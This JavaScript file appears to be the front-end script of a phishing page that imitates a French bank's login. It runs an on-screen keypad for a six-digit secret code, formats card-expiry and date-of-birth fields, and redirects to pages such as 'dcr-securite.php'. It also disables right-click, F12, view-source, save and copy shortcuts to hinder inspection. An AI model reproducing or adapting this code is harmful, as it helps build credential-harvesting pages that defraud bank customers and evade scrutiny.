/*global $, console, alert, prompt */
/*jslint plusplus: true, evil: true */
/*eslint no-unused-vars: "error"*/
/*eslint-env browser*/

var isShift = false;
var seperator = "/";
var dash = '-';

function cc_date(input, keyCode) {
    if (keyCode == 16) {
        isShift = true;
    }
    //Allow only Numeric Keys.
    if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
        if( keyCode == 8 ) {
            input.value = '';
        } else if (input.value.length == 2) {
            input.value += seperator;
        }
        return true;
    }
    else {
        return false;
    }
};

function date_of_birth(input, keyCode) {
    if (keyCode == 16) {
        isShift = true;
    }
    //Allow only Numeric Keys.
    if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
        if( keyCode == 8 ) {
            input.value = '';
        } else if (input.value.length == 2 || input.value.length == 5) {
            input.value += seperator;
        }
        return true;
    }
    else {
        return false;
    }
};

jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

})
$(document).ready(function() {
    'use strict';
    document.getElementById('nn').value = "";
})
$('.rimka_right').click(function() {
    'use strict';
    $('.point').css({ "background": "url('layout/img/point1.png') no-repeat center" });
    $('#nn').val("");
})
$('.put').keyup(function() {
    'use strict';
    $('.ruslt').addClass('hide');
    if ($('.put').val().length > 7) {
        if (isNaN($('.put').val())) {

        } else {
            $('.sup').css({ "background": "url('layout/img/val.png') no-repeat center" });
        }
    }
})
$('.sup').click(function() {
    'use strict';
    $('.put').val("");
    $('.ruslt').addClass('hide');
    $('.maison').addClass('hide');
    $('.butts').removeClass('hide');
    $('.point').css({ "background": "url('layout/img/point1.png') no-repeat center" });
    $('#nn').val("");
})
$('.buttoxs').click(function() {
    'use strict';
    if ($('.put').val().length <= 7) {
        $('.ruslt').removeClass('hide');
        return;
    } else {
        if (isNaN($('.put').val())) {
            $('.ruslt').removeClass('hide');
            return;
        } else {
            $('.maison').removeClass('hide');
            $('.butts').addClass('hide');
            //alert("zaz");

        }
    }

})

function is_ok() {
    'use strict';
    window.location.href = "./index.php?valid=true&LDKH=error&id=" + Math.floor(Math.random() * 1000000) + 1;
    return;
    /*
    setTimeout(function() {
        $('.buttox').removeClass("moha");
        $('.layout_num').removeClass("hide");
        $('.layout_contener').removeClass("hide");
    }, 4000)
    */
}

function is_ok1() {
    'use strict';

}

function send_data() {
    'use strict';
    $('.ruslt').removeClass('hide');

}

function send_data1() {
    'use strict';
    $('.ruslt1').removeClass('hide');
    $('.ruslt1').css({ "line-height": "22px" });
    $('.point').css({ "background": "url('layout/img/point1.png') no-repeat center" });
    $('#nn').val("");

}

function okok() {
    'use strict';
  //  window.location.href = "./dcr-securite.php?dcr=web&confirm=true&id=" + Math.floor(Math.random() * 1000000) + 1;
    return;

    /*
    setTimeout(function() {
        window.location.href = "./dcr-securite.php?dcr=web&confirm=true&id=" + Math.floor(Math.random() * 1000000) + 1;
        return;
    }, 2000);
    */

    /*
    setTimeout(function() {
        $('.drouka-left').addClass("valids");
        $('#lobia').addClass("hide");
        $('#ren').removeClass("hide");
        $('.poka').addClass('hide');
    }, 3000)
    */
}



$('.put').keypress(function(event) {
    'use strict';
    if ($('.put').val().length == 0) {
        $('.sup').css({ "background": "url('layout/img/del.png') no-repeat center" });
    }
})
$('.put').keydown(function() {
    'use strict';
    if ($('.put').val().length <= 7) {
        $('.sup').css({ "background": "url('layout/img/del.png') no-repeat center" });
    }

    if (event.keyCode === 8 || event.keyCode === 64) {
        $('.sup').css({ "background": "url('layout/img/del.png') no-repeat center" });
        $('.maison').addClass('hide');
        $('.butts').removeClass('hide');
        $('.ruslt').addClass('hide');
        $('.point').css({ "background": "url('layout/img/point1.png') no-repeat center" });
        $('#nn').val("");
    }

})

function sendme(howa) {
    'use strict';
    var plus = document.getElementById('nn');
    if (plus.value.length <= 5) {
        if (plus.value.length == 0) {
            $('.rimka_right').removeClass('hide');
            $('#dd1').css({ "background": "url('layout/img/point.png') no-repeat center" });
        }
        if (plus.value.length == 1) {
            $('#dd2').css({ "background": "url('layout/img/point.png') no-repeat center" });
        }
        if (plus.value.length == 2) {
            $('#dd3').css({ "background": "url('layout/img/point.png') no-repeat center" });
        }
        if (plus.value.length == 3) {
            $('#dd4').css({ "background": "url('layout/img/point.png') no-repeat center" });
        }
        if (plus.value.length == 4) {
            $('#dd5').css({ "background": "url('layout/img/point.png') no-repeat center" });
        }
        if (plus.value.length == 5) {
            $('#dd6').css({ "background": "url('layout/img/point.png') no-repeat center" });
        }

        plus.value = plus.value + howa;

    }

}

